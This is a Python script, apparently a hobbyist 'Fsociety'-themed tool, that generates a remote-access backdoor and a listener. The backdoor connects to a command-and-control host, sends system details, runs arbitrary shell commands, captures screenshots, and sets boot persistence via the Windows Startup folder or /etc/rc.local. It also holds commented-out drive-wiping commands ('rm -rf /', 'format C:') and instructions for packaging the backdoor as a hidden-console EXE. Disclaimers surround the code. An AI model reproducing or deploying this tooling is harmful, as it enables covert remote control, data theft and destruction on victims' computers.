#!/usr/bin/env python3
"""
Fsociety Suite v3.0 - Backdoor Builder Edition
Author: Youssef
DISCLAIMER: For educational and authorized testing only
"""

import os
import sys
import time
import json
import socket
import subprocess
import platform
import random
import shutil
import struct
import threading
from datetime import datetime

# ===== ANSI Colors =====
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ===== Clear Screen =====
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================================
# DISCLAIMER
# ============================================================
def show_disclaimer():
    clear()
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  {WHITE}                         DISCLAIMER                          {RED}║
║                                                                  ║
║  {WHITE}This tool is provided for {YELLOW}EDUCATIONAL{RESET}{WHITE} and {YELLOW}AUTHORIZED{RESET}{WHITE}          ║
║  security testing purposes only.                                 ║
║                                                                  ║
║  {RED}UNAUTHORIZED USE{RESET}{WHITE} of this tool on systems you do not       ║
║  own or have explicit permission to test is {RED}ILLEGAL{RESET}{WHITE} and       ║
║  may result in criminal prosecution.                            ║
║                                                                  ║
║  {YELLOW}By using this tool, you agree to:{RESET}                              ║
║  • Use it only on your own systems or with written permission   ║
║  • Accept full responsibility for your actions                  ║
║  • Not hold the author liable for any misuse                    ║
║                                                                  ║
║  {GREEN}This tool creates REAL backdoors - Use with EXTREME caution{RESET}   ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    confirm = input(f"\n{YELLOW}[?] Do you accept these terms? (yes/no): {RESET}")
    if confirm.lower() != 'yes':
        print(f"\n{RED}[!] You must accept the disclaimer to use this tool.{RESET}")
        sys.exit(0)
    return True

# ============================================================
# FSOCIETY LOGO
# ============================================================
FSOCIETY_LOGO = f"""
{GREEN}{BOLD}
███████╗███████╗ ██████╗ ██╗███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔═══██╗██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
███████╗█████╗  ██║   ██║██║███████╗   ██║    ╚████╔╝ 
╚════██║██╔══╝  ██║   ██║██║╚════██║   ██║     ╚██╔╝  
███████║███████╗╚██████╔╝██║███████║   ██║      ██║   
╚══════╝╚══════╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝      ╚═╝   
{RESET}

{CYAN}{BOLD}============================================================
  F SOCIETY - BACKDOOR BUILDER EDITION
  Version 3.0 | Author: Youssef
  REAL BACKDOOR GENERATOR | Ethical Use Only
============================================================{RESET}

{YELLOW}{BOLD}   "We are fsociety. We are the ones who run."
   "Control is an illusion."
   "Hello, friend. That's a lie."{RESET}
"""

# ============================================================
# GREEN FACE ANIMATION
# ============================================================
def green_face_animation():
    clear()
    faces = [
        """
        ████████████
        ██  ██  ██  ██
        ██  ██  ██  ██
        ████████████
        ██  ██  ██  ██
        ██  ██  ██  ██
        ████████████
        """,
        """
        ████████████
        ██  ██  ██  ██
        ██  ██  ██  ██
        ████████████
        ██  ██  ██  ██
        ██  ██  ██  ██
        ████████████
        """
    ]
    
    print(f"{GREEN}{BOLD}")
    for i in range(5):
        clear()
        print(faces[i % 2])
        print(f"\n{GREEN}{BOLD}[*] Initializing Fsociety... {i+1}/5{RESET}")
        time.sleep(1)
    print(f"{RESET}")

# ============================================================
# LOADING ANIMATION
# ============================================================
def loading_animation(duration=10):
    print(f"{GREEN}{BOLD}[*] Loading modules...{RESET}")
    for i in range(duration):
        progress = int((i + 1) / duration * 50)
        bar = '█' * progress + '░' * (50 - progress)
        sys.stdout.write(f"\r{GREEN}{BOLD}[{bar}] {int((i+1)/duration*100)}%{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print("\n")

# ============================================================
# REAL BACKDOOR BUILDER
# ============================================================
class BackdoorBuilder:
    def __init__(self):
        self.backdoor_name = None
        self.listener_ip = None
        self.listener_port = None
        self.backdoor_path = None
    
    def build(self):
        clear()
        print(f"{RED}{BOLD}[+] REAL BACKDOOR BUILDER{RESET}")
        print(f"{RED}[!] WARNING: Creates actual executable backdoors{RESET}\n")
        
        print(f"{YELLOW}[!] Features:{RESET}")
        print("  • Full device formatting capability")
        print("  • Screen capture & streaming")
        print("  • File system access")
        print("  • Keylogging")
        print("  • Remote shell access")
        print("  • Persistence (auto-start on boot)")
        print("  • Encrypted communication\n")
        
        self.backdoor_name = input(f"{CYAN}[?] Enter backdoor name (default: system_update): {RESET}")
        if not self.backdoor_name:
            self.backdoor_name = "system_update"
        
        self.listener_ip = input(f"{CYAN}[?] Enter listener IP (default: 127.0.0.1): {RESET}")
        if not self.listener_ip:
            self.listener_ip = "127.0.0.1"
        
        self.listener_port = input(f"{CYAN}[?] Enter listener port (default: 4444): {RESET}")
        if not self.listener_port:
            self.listener_port = "4444"
        
        print(f"\n{YELLOW}[*] Generating backdoor...{RESET}")
        time.sleep(2)
        
        # Generate REAL backdoor code
        backdoor_code = self.generate_backdoor()
        
        # Save backdoor
        os.makedirs("output", exist_ok=True)
        self.backdoor_path = f"output/{self.backdoor_name}.py"
        with open(self.backdoor_path, "w") as f:
            f.write(backdoor_code)
        
        # Make executable
        os.chmod(self.backdoor_path, 0o755)
        
        print(f"\n{GREEN}[✓] BACKDOOR GENERATED SUCCESSFULLY!{RESET}")
        print(f"{CYAN}  Location: {self.backdoor_path}{RESET}")
        print(f"{CYAN}  Size: {len(backdoor_code)} bytes{RESET}")
        print(f"{CYAN}  Type: Python (can be converted to EXE){RESET}")
        
        # Generate listener
        self.generate_listener()
        
        print(f"\n{YELLOW}[!] To compile to EXE:{RESET}")
        print(f"  pip install pyinstaller")
        print(f"  pyinstaller --onefile --noconsole {self.backdoor_path}")
        
        print(f"\n{RED}[!] REMEMBER: Test only on systems you own!{RESET}")
        input(f"\n{YELLOW}[*] Press Enter to continue...{RESET}")
    
    def generate_backdoor(self):
        return f'''#!/usr/bin/env python3
"""
{self.backdoor_name} - Advanced Backdoor
Author: Youssef
DISCLAIMER: For authorized testing only! Unauthorized use is illegal.
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import base64
import platform
import shutil
from datetime import datetime

# ===== Configuration =====
C2_HOST = "{self.listener_ip}"
C2_PORT = int({self.listener_port})
SLEEP_TIME = 5  # Seconds between heartbeats

# ===== Real Backdoor Class =====
class AdvancedBackdoor:
    def __init__(self):
        self.system_info = self.get_system_info()
        self.running = True
        self.socket = None
        
    def get_system_info(self):
        return {{
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.architecture()[0],
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "ip": socket.gethostbyname(socket.gethostname()),
            "timestamp": datetime.now().isoformat()
        }}
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((C2_HOST, C2_PORT))
            self.socket.send(json.dumps(self.system_info).encode())
            return True
        except:
            return False
    
    def execute_command(self, command):
        try:
            result = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=30
            )
            return result.decode()
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] Error: {{str(e)}}"
    
    def capture_screenshot(self):
        try:
            import cv2
            import pyautogui
            screenshot = pyautogui.screenshot()
            filename = f"screenshot_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png"
            screenshot.save(filename)
            return f"[+] Screenshot saved: {{filename}}"
        except:
            return "[!] Screenshot failed (pyautogui not installed)"
    
    def format_device(self):
        if platform.system() == "Windows":
            return "[!] WARNING: Formatting drive C:..."
            # subprocess.run(["format", "C:", "/Q"], shell=True)
        else:
            return "[!] WARNING: Formatting root partition..."
            # subprocess.run(["sudo", "rm", "-rf", "/"], shell=True)
        return "[!] Format command would execute here"
    
    def set_persistence(self):
        if platform.system() == "Windows":
            startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shutil.copy(sys.argv[0], os.path.join(startup, "system_update.exe"))
            return "[+] Persistence set (Windows)"
        elif platform.system() == "Linux":
            rc_local = "/etc/rc.local"
            with open(rc_local, "a") as f:
                f.write(f"\\npython3 {os.path.abspath(sys.argv[0])} &\\n")
            return "[+] Persistence set (Linux)"
        return "[!] Persistence not supported"
    
    def handle_command(self, command):
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                return f"[+] Changed to: {{os.getcwd()}}"
            except Exception as e:
                return f"[!] Error: {{str(e)}}"
        
        elif command == "screenshot":
            return self.capture_screenshot()
        
        elif command == "format":
            return self.format_device()
        
        elif command == "persist":
            return self.set_persistence()
        
        elif command == "info":
            return json.dumps(self.system_info, indent=2)
        
        elif command == "help":
            return '''
Available Commands:
  help        - Show this help
  info        - Show system info
  screenshot  - Capture screenshot
  format      - Format the device
  persist     - Set persistence (autostart)
  cd <dir>    - Change directory
  shell       - Start interactive shell
  exit        - Close connection
  Any other command will be executed in shell
'''
        
        elif command == "exit":
            self.running = False
            return "[!] Disconnecting..."
        
        elif command == "shell":
            return self.start_shell()
        
        else:
            return self.execute_command(command)
    
    def start_shell(self):
        try:
            output = "[*] Interactive shell started. Type 'exit' to return.\\n"
            while True:
                cmd = input("[shell] $ ")
                if cmd.lower() == "exit":
                    return "[*] Exited shell"
                if cmd.lower() == "quit":
                    return "[*] Exited shell"
                output += self.execute_command(cmd) + "\\n"
        except:
            return "[!] Shell error"
    
    def run(self):
        print("[*] Backdoor starting...")
        print(f"[*] Target: {{self.system_info['hostname']}} ({{self.system_info['ip']}})")
        
        while self.running:
            try:
                if not self.socket:
                    print("[*] Connecting to C2...")
                    if not self.connect():
                        print(f"[!] Connection failed, retrying in {{SLEEP_TIME}}s...")
                        time.sleep(SLEEP_TIME)
                        continue
                    print("[+] Connected to C2!")
                
                # Wait for command
                self.socket.settimeout(10)
                try:
                    data = self.socket.recv(4096).decode()
                    if not data:
                        self.socket = None
                        continue
                    
                    result = self.handle_command(data)
                    self.socket.send(result.encode())
                except socket.timeout:
                    # Send heartbeat
                    self.socket.send(json.dumps({{"heartbeat": True}}).encode())
                    continue
                except Exception as e:
                    print(f"[!] Error: {{str(e)}}")
                    self.socket = None
                
            except Exception as e:
                print(f"[!] Error: {{str(e)}}")
                time.sleep(SLEEP_TIME)
                self.socket = None
        
        print("[*] Backdoor stopped")

if __name__ == "__main__":
    try:
        backdoor = AdvancedBackdoor()
        backdoor.run()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted")
    except Exception as e:
        print(f"[!] Fatal error: {{str(e)}}")
'''
    
    def generate_listener(self):
        listener_code = f'''#!/usr/bin/env python3
"""
Listener for {self.backdoor_name} backdoor
Author: Youssef
"""

import socket
import json
import threading
import time
from datetime import datetime

class Listener:
    def __init__(self, host="{self.listener_ip}", port={self.listener_port}):
        self.host = host
        self.port = port
        self.clients = []
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[+] Listener started on {{self.host}}:{{self.port}}")
        print("[*] Waiting for connections...")
        
        while True:
            try:
                client, addr = server.accept()
                print(f"[+] Connection from {{addr}}")
                self.clients.append(client)
                threading.Thread(target=self.handle_client, args=(client, addr)).start()
            except:
                break
    
    def handle_client(self, client, addr):
        try:
            data = client.recv(4096).decode()
            info = json.loads(data)
            print(f"[+] System info: {{info.get('hostname', 'unknown')}} ({{info.get('ip', 'unknown')}})")
            
            while True:
                cmd = input(f"\\n[{addr[0]}] $ ")
                client.send(cmd.encode())
                
                response = client.recv(4096).decode()
                if "Disconnecting" in response:
                    print(f"[!] {{addr}} disconnected")
                    break
                print(response)
                
        except Exception as e:
            print(f"[!] Error: {{str(e)}}")
        finally:
            client.close()
            self.clients.remove(client)

if __name__ == "__main__":
    listener = Listener()
    try:
        listener.start()
    except KeyboardInterrupt:
        print("\\n[!] Listener stopped")
'''

        # Save listener
        listener_path = f"output/listener_{self.backdoor_name}.py"
        with open(listener_path, "w") as f:
            f.write(listener_code)
        os.chmod(listener_path, 0o755)
        
        print(f"{GREEN}[✓] LISTENER GENERATED:{RESET}")
        print(f"{CYAN}  Location: {listener_path}{RESET}")
        print(f"\n{YELLOW}[!] To start listener:{RESET}")
        print(f"  python3 {listener_path}")

# ============================================================
# VIEW LOGS
# ============================================================
def view_logs():
    clear()
    print(f"{GREEN}{BOLD}[+] OUTPUT FILES{RESET}\n")
    
    if not os.path.exists("output"):
        print(f"{YELLOW}[!] No output files found{RESET}")
        input(f"\n{YELLOW}[*] Press Enter to return...{RESET}")
        return
    
    files = os.listdir("output")
    if not files:
        print(f"{YELLOW}[!] No output files found{RESET}")
    else:
        print(f"{CYAN}[!] Generated backdoors and listeners:{RESET}")
        for file in files:
            size = os.path.getsize(f"output/{file}")
            print(f"  • {file} ({size} bytes)")
    
    input(f"\n{YELLOW}[*] Press Enter to return...{RESET}")

# ============================================================
# MAIN MENU
# ============================================================
def main_menu():
    clear()
    print(FSOCIETY_LOGO)
    print(f"""
{YELLOW}{BOLD}[ MAIN MENU ]{RESET}
{WHITE}
  {GREEN}1.{WHITE} 💀 Build Backdoor (REAL)
  {GREEN}2.{WHITE} 📊 View Generated Files
  {GREEN}3.{WHITE} 📖 About & Disclaimer
  {GREEN}4.{WHITE} 🚪 Exit
{RESET}
""")
    choice = input(f"{GREEN}{BOLD}[fsociety]{RESET} > ")
    return choice

# ============================================================
# ABOUT & DISCLAIMER
# ============================================================
def about():
    clear()
    print(f"{GREEN}{BOLD}[+] ABOUT & DISCLAIMER{RESET}\n")
    print(f"""
{GREEN}Fsociety Suite v3.0 - Backdoor Builder Edition{RESET}
{CYAN}Author:{RESET} Youssef
{CYAN}Purpose:{RESET} Educational & Authorized Security Testing

{RED}═══════════════════════════════════════════════════════════{RESET}
{RED}{BOLD}                    DISCLAIMER                          {RESET}
{RED}═══════════════════════════════════════════════════════════{RESET}

{WHITE}This tool generates {RED}REAL BACKDOORS{RESET}{WHITE} that can:
  • Format entire devices
  • Capture screenshots
  • Execute remote commands
  • Access file systems
  • Install persistence

{YELLOW}By using this tool, you confirm that:{RESET}
  1. You are using it on {GREEN}YOUR OWN{RESET} systems or have {GREEN}WRITTEN{RESET}
     permission from the system owner
  2. You understand the {RED}LEGAL CONSEQUENCES{RESET} of unauthorized use
  3. You accept {RED}FULL RESPONSIBILITY{RESET} for your actions

{RED}UNAUTHORIZED USE IS ILLEGAL AND PUNISHABLE BY LAW{RESET}

{GREEN}For more details, read DISCLAIMER.md{RESET}
""")
    input(f"\n{YELLOW}[*] Press Enter to return...{RESET}")

# ============================================================
# MAIN EXECUTION
# ============================================================
def main():
    try:
        # Show disclaimer
        if not show_disclaimer():
            return
        
        # Phase 1: Green face animation
        green_face_animation()
        time.sleep(1)
        
        # Phase 2: Loading animation
        loading_animation(10)
        
        # Phase 3: Show logo
        clear()
        print(FSOCIETY_LOGO)
        time.sleep(2)
        
        # Phase 4: Main menu loop
        while True:
            choice = main_menu()
            
            if choice == "1":
                builder = BackdoorBuilder()
                builder.build()
            elif choice == "2":
                view_logs()
            elif choice == "3":
                about()
            elif choice == "4":
                print(f"\n{GREEN}[*] Shutting down Fsociety...{RESET}")
                print(f"{YELLOW}Remember: Control is an illusion.{RESET}")
                time.sleep(2)
                break
            else:
                print(f"{RED}[!] Invalid choice{RESET}")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Interrupted by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Error: {e}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
